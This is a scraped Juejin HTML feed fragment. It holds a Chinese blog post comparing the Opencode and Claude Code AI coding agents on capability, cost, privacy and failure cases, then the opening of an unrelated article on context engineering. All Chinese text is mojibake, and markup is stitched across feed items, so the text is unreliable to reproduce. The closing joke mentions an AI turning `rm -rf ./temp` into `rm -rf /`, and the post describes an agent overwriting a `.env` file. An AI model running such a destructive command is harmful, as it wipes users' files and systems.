                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç°åœ¨çš„ä»£ç åœˆå­ï¼Œä½ è¦æ˜¯æ²¡ä¸ª AI Agent å¸®ä½ å†™ä»£ç ï¼Œå‡ºé—¨éƒ½ä¸å¥½æ„æ€è·Ÿäººæ‰“æ‹›å‘¼ã€‚</p>
<p>ä»Šå¤©å’±ä»¬ä¸æ•´é‚£äº›è™šå¤´å·´è„‘çš„å‚æ•°å¯¹æ¯”ï¼Œç›´æ¥ä¸Šç¡¬èœã€‚ä¸€è¾¹æ˜¯ä¸»æ‰“â€œè‡ªç”±ã€å¼€æºã€å¯ç©æ€§æé«˜â€çš„ <strong>Opencode</strong> é˜µè¥ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ç°åœ¨è¿™å·è§’è‰²çš„ä»£è¡¨ï¼‰ï¼Œå¦ä¸€è¾¹æ˜¯å«ç€é‡‘æ±¤åŒ™å‡ºç”Ÿã€ä¼˜é›…ä¸æ»‘ä½†ç•¥æ˜¾å°é—­çš„ <strong>Claude Code</strong>ã€‚</p>
<p>åˆ°åº•è°èƒ½å¸®ä½ æ—©ç‚¹ä¸‹ç­ï¼Œè°åˆä¼šè®©ä½ åŠå¤œåœ¨å±å¹•å‰â€œçº¢æ¸©â€ï¼Ÿå’±ä»¬æ¥ç›˜ä¸€ç›˜ã€‚</p>
<h2 data-id="heading-0">Round 1ï¼šè„‘å­å¥½ä½¿ç¨‹åº¦ï¼ˆæ¨¡å‹ç¡¬å®åŠ›ï¼‰</h2>
<p><strong>Claude Code</strong>
è¿™ç©æ„å„¿èƒŒåä¸»è¦è·‘çš„æ˜¯ <code>Claude 3.5 Sonnet</code>ã€‚è¯´å®è¯ï¼Œè¿™æ³¢ Sonnet æ˜¯åœ¨å¤§æ°”å±‚çš„ã€‚å®ƒçš„é€»è¾‘æ¨ç†èƒ½åŠ›ã€å¯¹å¤æ‚ä¸Šä¸‹æ–‡çš„ç†è§£ï¼Œç›®å‰ç¡®å®æ˜¯ T0 çº§åˆ«çš„ã€‚</p>
<ul>
<li><strong>é«˜å…‰æ—¶åˆ»</strong>ï¼šä½ æŠŠä¸€å¨å‡ åä¸ªæ–‡ä»¶çš„å±å±±æ‰”ç»™å®ƒï¼Œè¯´â€œå¸®æˆ‘é‡æ„ä¸€ä¸‹ Auth æ¨¡å—ï¼Œé¡ºä¾¿æŠŠé‚£ä¸ªè¯¥æ­»çš„ Race Condition ä¿®äº†â€ï¼Œå®ƒä¸ä»…èƒ½ä¿®å¥½ï¼Œè¿˜èƒ½ç»™ä½ å†™æ¸…æ¥šé‡æ„æ€è·¯ï¼Œç”šè‡³è´´å¿ƒåœ°è¡¥ä¸Šæµ‹è¯•ç”¨ä¾‹ã€‚</li>
<li><strong>ç”¨æˆ·å¿ƒå£°</strong>ï¼šâ€œè™½ç„¶æœ‰ç‚¹è´µï¼Œä½†å®ƒæ˜¯çœŸæ‡‚æˆ‘ã€‚â€</li>
</ul>
<p><strong>Opencode</strong>
Opencode ä¸»æ‰“ä¸€ä¸ªâ€œä¸°ä¿­ç”±äººâ€ã€‚ä½ å¯ä»¥æ¥ Claudeï¼Œä¹Ÿå¯ä»¥æ¥ GPT-4oï¼Œç”šè‡³å¯ä»¥æ¥æœ€è¿‘ç«å‡ºåœˆçš„ <strong>DeepSeek-V3</strong> æˆ–è€…æœ¬åœ°è·‘ä¸ª Llama 3ã€‚</p>
<ul>
<li><strong>é«˜å…‰æ—¶åˆ»</strong>ï¼šå½“ä½ æ¢ä¸Š DeepSeek æˆ–è€… o1 æ¨¡å‹æ¥è§£å†³ç®—æ³•é¢˜æ—¶ï¼ŒOpencode çš„è¡¨ç°å®Œå…¨ä¸è¾“å®˜æ–¹å·¥å…·ã€‚æœ€é‡è¦çš„æ˜¯ï¼Œä½ å¯ä»¥é’ˆå¯¹ç‰¹å®šä»»åŠ¡åˆ‡æ¢æ¨¡å‹ï¼Œæ¯”å¦‚å†™æ–‡æ¡£ç”¨ä¾¿å®œçš„æ¨¡å‹ï¼Œä¿® Bug ç”¨æœ€è´µçš„æ¨¡å‹ã€‚</li>
<li><strong>ç”¨æˆ·å¿ƒå£°</strong>ï¼šâ€œæˆ‘å‘½ç”±æˆ‘ä¸ç”±å¤©ï¼Œæˆ‘çš„ Token æˆ‘åšä¸»ã€‚â€</li>
</ul>
<h2 data-id="heading-1">Round 2ï¼šé’±åŒ…çš„åšåº¦ï¼ˆæˆæœ¬ä¸éšç§ï¼‰</h2>
<p><strong>Claude Code</strong>
é‚£æ˜¯çœŸçš„æœ‰ç‚¹â€œåºŸé’±åŒ…â€ã€‚å®ƒæ˜¯æŒ‰ Token è®¡è´¹çš„ï¼Œè€Œä¸”å®˜æ–¹å·¥å…·å¾€å¾€ä¼šæœ‰å¾ˆå¤šéšå¼çš„ Context æ³¨å…¥ï¼ˆä¸ºäº†ä¿æŒå¥½ç”¨çš„ä½“éªŒï¼‰ï¼Œå¯¼è‡´ Token ç‡ƒçƒ§é€Ÿåº¦å ªæ¯”ç¾è‚¡ç†”æ–­ã€‚</p>
<ul>
<li><strong>æ§½ç‚¹</strong>ï¼šæœ‰æ—¶å€™ä½ åªæ˜¯æƒ³æ”¹ä¸ªå˜é‡åï¼Œå®ƒæŠŠæ•´ä¸ªæ–‡ä»¶ä¸Šä¸‹æ–‡éƒ½è¯»äº†ä¸€éï¼Œé‚£ä¸€ç¬é—´å¿ƒéƒ½åœ¨æ»´è¡€ã€‚</li>
</ul>
<p><strong>Opencode</strong>
è¿™æ˜¯ Opencode çš„ä¸»åœºã€‚</p>
<ol>
<li><strong>çœé’±</strong>ï¼šä½ å¯ä»¥æ¥ DeepSeek è¿™ç§â€œä»·æ ¼å± å¤«â€APIï¼Œæˆæœ¬å‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</li>
<li><strong>éšç§</strong>ï¼šå¯¹äºä¿å¯†é¡¹ç›®ï¼Œä½ å¯ä»¥ç›´æ¥è¿æœ¬åœ°çš„ Ollamaï¼Œç½‘çº¿ä¸€æ‹”ï¼Œè€æ¿å†ä¹Ÿä¸ç”¨æ‹…å¿ƒä»£ç æ³„éœ²ç»™ç¾å›½äººäº†ã€‚</li>
</ol>
<h2 data-id="heading-2">Round 3ï¼šç¿»è½¦ç°åœºå®å½•ï¼ˆçœŸå®æ¡ˆä¾‹ï¼‰</h2>
<p>è¿™é‡Œé‡ç‚¹è®²è®²ï¼Œå› ä¸ºè¿™æ‰æ˜¯å’±ä»¬é€‰å‹çš„å…³é”®ã€‚</p>
<h3 data-id="heading-3">ğŸš¨ Claude Code çš„â€œç¿»è½¦â€ï¼šè¿‡åº¦è‡ªä¿¡çš„ä¼˜é›…</h3>
<p><strong>åœºæ™¯</strong>ï¼š
è®©ä½ å†™ä¸€ä¸ªç®€å•çš„ Python è„šæœ¬ï¼Œå»æŠ“å–æŸä¸ªç½‘é¡µçš„æ ‡é¢˜ã€‚</p>
<p><strong>Claude Code çš„æ“ä½œ</strong>ï¼š
å®ƒå¯èƒ½ä¼šç»™ä½ æ•´å‡ºä¸€å¥—å¾®æœåŠ¡æ¶æ„ã€‚</p>
<blockquote>
<p>â€œäº²ï¼Œä¸ºäº†ä¿è¯å¯æ‰©å±•æ€§ï¼Œæˆ‘ä¸ºæ‚¨å¼•å…¥äº† <code>Scrapy</code> æ¡†æ¶ï¼Œé…ç½®äº† <code>Redis</code> åšå»é‡é˜Ÿåˆ—ï¼Œè¿˜åŠ äº† <code>Docker-compose</code> æ–‡ä»¶å“¦ï¼â€</p>
</blockquote>
<p><strong>åæœ</strong>ï¼š
æœ¬æ¥ 5 è¡Œ <code>requests</code> + <code>BeautifulSoup</code> èƒ½æå®šçš„äº‹ï¼Œç°åœ¨ä½ å¾—èŠ±åŠå°æ—¶å»é…ç¯å¢ƒã€‚è¿™å°±æ˜¯å…¸å‹çš„ <strong>â€œå¤§ç‚®æ‰“èšŠå­ï¼ŒæŠŠèšŠå­ç‚¸æ²¡äº†ï¼Œæˆ¿å­ä¹Ÿå¡Œäº†â€</strong>ã€‚</p>
<h3 data-id="heading-4">ğŸš¨ Opencode çš„â€œç¿»è½¦â€ï¼šé…ç½®åœ°ç‹±ä¸ä¸Šä¸‹æ–‡ä¸¢å¤±</h3>
<p><strong>åœºæ™¯</strong>ï¼š
ä½ æ­£åœ¨åšä¸€ä¸ªå¤æ‚çš„å…¨æ ˆéœ€æ±‚ï¼Œæ¶‰åŠåˆ°å‰ç«¯ React å’Œåç«¯ Node.js çš„è”åŠ¨ã€‚</p>
<p><strong>Opencode çš„æ“ä½œ</strong>ï¼š
ç”±äº Opencode éœ€è¦ä½ è‡ªå·±ç®¡ç†å¾ˆå¤šå·¥å…·é“¾æˆ–è€… Prompt ç­–ç•¥ã€‚</p>
<blockquote>
<p>ä½ ï¼šæŠŠè¿™ä¸ª API çš„è¿”å›å€¼æ”¹ä¸€ä¸‹ã€‚
Opencode (é…åˆæŸä¸ªä¾¿å®œæ¨¡å‹)ï¼šå¥½çš„ã€‚ï¼ˆæ”¹äº†åç«¯ï¼‰
ä½ ï¼šå‰ç«¯æ€ä¹ˆæŠ¥é”™äº†ï¼Ÿ
Opencodeï¼šå“å‘€ï¼Œæˆ‘å¿˜äº†å‰ç«¯ä¹Ÿè¦æ”¹ç±»å‹å®šä¹‰äº†ã€‚ï¼ˆæ”¹äº†å‰ç«¯ï¼‰
ä½ ï¼šæ•°æ®åº“æ€ä¹ˆè¿ä¸ä¸Šäº†ï¼Ÿ
Opencodeï¼šåäº†ï¼Œåˆšæ‰æŠŠ <code>.env</code> æ–‡ä»¶å½“æˆæ™®é€šæ–‡æœ¬é‡å†™äº†...</p>
</blockquote>
<p><strong>åæœ</strong>ï¼š
è¿™å°±æ˜¯ä¼ è¯´ä¸­çš„ <strong>â€œæ‹†ä¸œå¢™è¡¥è¥¿å¢™ï¼Œæœ€åå¢™å…¨å€’äº†â€</strong>ã€‚å°¤å…¶æ˜¯åœ¨å¤„ç†è¶…é•¿ä¸Šä¸‹æ–‡æ—¶ï¼Œå¦‚æœé…ç½®ä¸å½“ï¼ˆæ¯”å¦‚æ²¡ç”¨å¥½å‘é‡æ•°æ®åº“æˆ– Context å‹ç¼©ï¼‰ï¼ŒOpencode å¾ˆå®¹æ˜“å˜æˆâ€œé‡‘é±¼è®°å¿†â€ã€‚</p>
<h2 data-id="heading-5">æ·±åº¦å®ä¾‹ï¼šå½“ä½ è¦ä¿®ä¸€ä¸ªé™ˆå¹´ Bug</h2>
<p><strong>Claude Code ä½“éªŒ</strong>ï¼š
ä½ è¾“å…¥ <code>/fix è¿™ä¸ªé¡µé¢åŠ è½½æ…¢</code>ã€‚
å®ƒä¼šè‡ªåŠ¨åˆ†æç½‘ç»œè¯·æ±‚ï¼ŒæŸ¥é˜…ä»£ç ï¼Œå¯èƒ½ä¼šè¯´ï¼šâ€œæˆ‘çœ‹äº†ä¸€ä¸‹ï¼Œä½ åœ¨å¾ªç¯é‡Œåšäº† SQL æŸ¥è¯¢ï¼ˆN+1 é—®é¢˜ï¼‰ï¼Œæˆ‘å¸®ä½ æ”¹æˆ <code>Promise.all</code> å¹¶è¡Œè¯·æ±‚äº†ï¼Œé¡ºä¾¿åŠ äº†ç¼“å­˜ã€‚â€
ğŸ‘‰ <strong>è¯„ä»·</strong>ï¼šåƒä¸ªè¿™å°±èŒ 3 å¹´çš„é«˜çº§å·¥ç¨‹å¸ˆï¼Œçœå¿ƒã€‚</p>
<p><strong>Opencode ä½“éªŒ</strong>ï¼š
ä½ éœ€è¦æ›´å…·ä½“çš„æŒ‡ä»¤ã€‚
ä½ å¯èƒ½å¾—å…ˆç”¨ <code>grep</code> å·¥å…·æœä¸€ä¸‹ä»£ç ï¼Œç„¶åæŠŠç›¸å…³æ–‡ä»¶å–‚ç»™å®ƒï¼Œè¯´ï¼šâ€œåˆ†æè¿™å‡ ä¸ªæ–‡ä»¶é‡Œçš„æ€§èƒ½ç“¶é¢ˆâ€ã€‚
å¦‚æœä½ æ¥çš„æ˜¯æœ¬åœ°å°æ¨¡å‹ï¼Œå®ƒå¯èƒ½ä¼šä¸€æœ¬æ­£ç»åœ°èƒ¡è¯´å…«é“ï¼šâ€œå»ºè®®ä½ æŠŠ CPU æ¢æˆ i9ã€‚â€
ä½†å¦‚æœä½ è°ƒæ•™å¾—å¥½ï¼Œç»™å®ƒé…ä¸Šäº†æœ€å¼ºçš„ API å’Œå‡†ç¡®çš„ Promptï¼Œå®ƒèƒ½é€šè¿‡æ‰§è¡Œ Shell è„šæœ¬å¸®ä½ æ’æŸ¥å‡ºè¿ Claude éƒ½ä¸ä¸€å®šèƒ½å‘ç°çš„ç¯å¢ƒå˜é‡é—®é¢˜ã€‚
ğŸ‘‰ <strong>è¯„ä»·</strong>ï¼šåƒä¸ªæå®¢æ‰‹ä¸­çš„ç‘å£«å†›åˆ€ï¼Œå¼ºä¸å¼ºå…¨çœ‹ä½ ä¼šä¸ä¼šç”¨ã€‚</p>
<h2 data-id="heading-6">ç»“è®ºï¼šæ€ä¹ˆé€‰ï¼Ÿ</h2>

























<table><thead><tr><th align="left">ä½ çš„å±æ€§</th><th align="left">æ¨èé€‰æ‹©</th><th align="left">ç†ç”±</th></tr></thead><tbody><tr><td align="left"><strong>ä¸å·®é’±ã€èµ¶æ—¶é—´ã€è¿½æ±‚æè‡´ä½“éªŒ</strong></td><td align="left"><strong>Claude Code</strong></td><td align="left">ä¹Ÿå°±æ˜¯æ¯ä¸ªæœˆå°‘å–å‡ æ¯æ˜Ÿå·´å…‹çš„äº‹ï¼Œä¹°çš„æ˜¯å¿ƒæƒ…èˆ’ç•…ã€‚</td></tr><tr><td align="left"><strong>çˆ±æŠ˜è…¾ã€Geek ç²¾ç¥ã€æ•°æ®æ•æ„Ÿ</strong></td><td align="left"><strong>Opencode</strong></td><td align="left">ä½ çš„å·¥ä½œæµä½ åšä¸»ï¼Œè¿˜èƒ½æ¥æœ¬åœ°æ¨¡å‹é˜²èº«ã€‚</td></tr><tr><td align="left"><strong>ç©·é¬¼ (æ¯”å¦‚æˆ‘)</strong></td><td align="left"><strong>Opencode + DeepSeek</strong></td><td align="left">è¿™ä¸€ç‚¹ä¹Ÿä¸ä¸¢äººï¼Œè¿™å«â€œé™æœ¬å¢æ•ˆâ€ (å®é™…å¯èƒ½æ˜¯é™æœ¬å¢ç¬‘ï¼Œçœ‹ä½ æ“ä½œäº†)ã€‚</td></tr></tbody></table>
<p><strong>æœ€åç»™ä¸ªå¿ å‘Š</strong>ï¼š
æ— è®ºä½ é€‰è°ï¼Œ<strong>Git Commit ä¹‹å‰ä¸€å®šè¦äººå·¥ Review ä¸€éï¼ä¸€å®šè¦ Reviewï¼</strong>
åˆ«é—®æˆ‘ä¸ºä»€ä¹ˆï¼Œæˆ‘ä¸æƒ³å›å¿†ä¸Šæ¬¡ AI å¸®æˆ‘æŠŠ <code>rm -rf ./temp</code> ä¼˜åŒ–æˆ <code>rm -rf /</code> çš„é‚£ä¸ªä¸‹åˆã€‚é‚£ç”»é¢å¤ªç¾ï¼Œæˆ‘ä¸æ•¢çœ‹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä» LangChain å’Œ Manus ä¸¤å·¨å¤´ä¸Šä¸‹æ–‡å·¥ç¨‹å®æˆ˜ä¸­å­¦åˆ°çš„ 5 ç‚¹ç»éªŒ]]></title>    <link>https://juejin.cn/post/7592816646869778441</link>    <guid>https://juejin.cn/post/7592816646869778441</guid>    <pubDate>2026-01-08T08:35:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592816646869778441" data-draft-id="7592710766010204170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä» LangChain å’Œ Manus ä¸¤å·¨å¤´ä¸Šä¸‹æ–‡å·¥ç¨‹å®æˆ˜ä¸­å­¦åˆ°çš„ 5 ç‚¹ç»éªŒ"/> <meta itemprop="keywords" content="Agent"/> <meta itemprop="datePublished" content="2026-01-08T08:35:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ½˜é”¦"/> <meta itemprop="url" content="https://juejin.cn/user/730549110707431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä» LangChain å’Œ Manus ä¸¤å·¨å¤´ä¸Šä¸‹æ–‡å·¥ç¨‹å®æˆ˜ä¸­å­¦åˆ°çš„ 5 ç‚¹ç»éªŒ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/730549110707431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ½˜é”¦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:35:10.000Z" title="Thu Jan 08 2026 08:35:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»16åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘ä»”ç»†çœ‹äº† LangChain çš„ Lance å’Œ Manus çš„ Pete çš„è§†é¢‘ï¼Œä¸»é¢˜æ˜¯æ„å»º AI æ™ºèƒ½ä½“ä¸­çš„ä¸Šä¸‹æ–‡å·¥ç¨‹ã€‚è¿™æ¬¡åˆ†äº«æ²¡æœ‰é‚£äº›ç©ºæ³›çš„ç†è®ºï¼Œå…¨æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸­éªŒè¯è¿‡çš„å®æˆ˜ç»éªŒã€‚</p>
<p>æˆ‘ç»“åˆè‡ªå·±çš„æ€è€ƒï¼Œæ•´ç†äº†æˆ‘è®¤ä¸º 5 ä¸ªæœ€æœ‰ä»·å€¼çš„æŠ€æœ¯è¦ç‚¹ï¼Œæ¯ä¸€ä¸ªéƒ½ç›´æ¥å½±å“ç€æ™ºèƒ½ä½“çš„æ€§èƒ½å’Œå¯ç”¨æ€§ã€‚</p>
<h2 data-id="heading-0">1. ä¸Šä¸‹æ–‡çˆ†ç‚¸æ˜¯æ™ºèƒ½ä½“æœ€å¤§çš„ç“¶é¢ˆ</h2>
<p>Manus ç»Ÿè®¡æ˜¾ç¤ºï¼Œä¸€ä¸ªå…¸å‹çš„æ™ºèƒ½ä½“ä»»åŠ¡éœ€è¦çº¦ 50 æ¬¡å·¥å…·è°ƒç”¨ã€‚Anthropic ä¹Ÿæåˆ°ï¼Œç”Ÿäº§ç¯å¢ƒä¸­çš„æ™ºèƒ½ä½“å¯¹è¯å¯èƒ½æŒç»­æ•°ç™¾è½®ã€‚æ¯æ¬¡å·¥å…·è°ƒç”¨éƒ½ä¼šè¿”å›ç»“æœï¼Œè¿™äº›ç»“æœä¼šä¸æ–­ç´¯ç§¯åœ¨æ¶ˆæ¯å†å²ä¸­ã€‚</p>
